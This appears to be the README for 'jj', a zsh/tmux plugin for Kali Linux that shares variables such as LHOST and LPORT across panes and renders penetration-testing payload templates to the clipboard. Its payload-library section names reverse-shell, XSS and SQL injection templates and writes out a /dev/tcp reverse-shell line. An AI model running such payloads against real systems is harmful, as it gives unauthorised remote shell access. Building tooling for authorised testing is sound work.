# jj

`jj` is a zsh plugin for tmux-scoped workflow variables and payload rendering.

It stores `JJ_` variables in the current tmux session, lets each pane load
those variables when needed, and renders payload templates from fresh tmux
session values.

```text
tmux session environment = shared source across panes
current shell environment = values directly usable in the current pane
payload renderer = always reads fresh tmux session values
```

## Requirements

- zsh
- tmux
- fzf for `jji` and `jjp`
- Optional clipboard backend: `clip.exe`, `wl-copy`, `xclip`, `xsel`, or `pbcopy`

Kali:

```zsh
sudo apt update
sudo apt install -y zsh tmux fzf wl-clipboard xclip xsel
```

## Kali Deployment

`jj` is installed through `jj.plugin.zsh`. Put the whole project directory under
your zsh plugin directory. Do not source internal files under `lib/` directly.

### 1. Install Dependencies

```zsh
sudo apt update
sudo apt install -y zsh tmux fzf wl-clipboard xclip xsel
```

### 2. Put Plugin Code In Place

For Kali + Oh My Zsh, put the plugin here:

```text
${ZSH_CUSTOM:-$HOME/.oh-my-zsh/custom}/plugins/jj
```

Source package path:

```text
/mnt/d/4_L-Repo/0_Developing/dev-tui-jj-kali
```

The target `jj` directory must contain the whole plugin package:

```text
jj/
  jj.plugin.zsh
  lib/
  payloads/
  doc/
  README.md
```

### 3. Enable The Plugin

Edit `~/.zshrc` and add `jj` to `plugins`:

```zsh
plugins=(git jj)
```

No extra `export JJ_PAYLOAD_DIR=...` line is needed for the bundled payloads.
The plugin sets this automatically:

```text
JJ_PLUGIN_DIR=${ZSH_CUSTOM:-$HOME/.oh-my-zsh/custom}/plugins/jj
JJ_PAYLOAD_DIR=${JJ_PLUGIN_DIR}/payloads
```

Reload zsh:

```zsh
source ~/.zshrc
```

Confirm it loaded:

```zsh
type jj
type jjp
echo $JJ_PAYLOAD_DIR
```

## Payload Setup

By default, the plugin points `JJ_PAYLOAD_DIR` to the bundled payload directory:

```text
${JJ_PLUGIN_DIR}/payloads
```

You do not need to export `JJ_PAYLOAD_DIR` for the bundled payloads. Override it
only if you keep payloads somewhere else:

```zsh
export JJ_PAYLOAD_DIR=/path/to/payloads
```

## Clipboard Setup

`jjp` copies rendered payloads to a clipboard backend.

Explicit backend:

```zsh
export JJ_CLIP_CMD='clip.exe'
export JJ_CLIP_CMD='xclip -selection clipboard'
export JJ_CLIP_CMD='tmux load-buffer -'
```

Auto-detect order:

```text
clip.exe
wl-copy
xclip
xsel
pbcopy
tmux set-buffer
```

## Commands

| Command | Wrapper | Purpose |
| --- | --- | --- |
| `jj set NAME VALUE` | `jjs NAME VALUE` | Set internal `JJ_NAME` in tmux and export `NAME` in this shell |
| `jj set` | `jjs` | Open a TUI to choose `DOMAIN/LHOST/RHOST/LPORT/RPORT` and type a value |
| `jj load` | `jjl` | Load tmux variables into this shell without the internal `JJ_` prefix |
| `jj interactive` | `jji` | Select tmux variables with fzf and load them without the internal `JJ_` prefix |
| `jj variable [PATTERN]` | `jjv [PATTERN]` | Print tmux variables without the internal `JJ_` prefix, filtered by name |
| `jj payload [CATEGORY]` | `jjp [CATEGORY]` | Select, render, copy, and print a payload |
| `jj unset NAME [...]` | | Remove `JJ_` variables from tmux and this shell |
| `jj help [COMMAND]` | `jjh [COMMAND]` | Show help |

## Basic Workflow

Run inside tmux:

```zsh
jjs
jjs LHOST 192.168.45.192
jjs LPORT 443
jjs DOMAIN example.test

jjv
jjp linux
```

`JJ_` is only an internal tmux namespace. User-facing commands and shell exports
use names without that prefix, such as `$LHOST` and `$DOMAIN`.

`jjp` reads tmux session variables directly. Another pane can render a payload
without running `jjl` first, even though `echo $LHOST` still needs `jjl`.

## Payload Library

Payload files are plain text templates under `JJ_PAYLOAD_DIR`.

Example:

```text
payloads/
  shell/
    linux/
      sh-tcp
      bash-tcp
      nc-mkfifo
    windows/
      powershell-rev
  xss/
    basic-alert
```

Use `${JJ_NAME}` placeholders:

```text
/bin/sh -i >/dev/tcp/${JJ_LHOST}/${JJ_LPORT} 2>&1 0>&1
```

Filter payloads by category:

```zsh
jjp
jjp shell
jjp linux
jjp windows
jjp xss
jjp sqli
```

## Documentation

- [Architecture](doc/architecture.md): plugin entrypoint, layer boundaries, and file responsibilities
- [Testing](doc/testing.md): syntax checks, tmux smoke tests, and cross-pane tests

## Help

```zsh
jj help
jj help set
jj help load
jj help variable
jj help payload
jj help unset
```
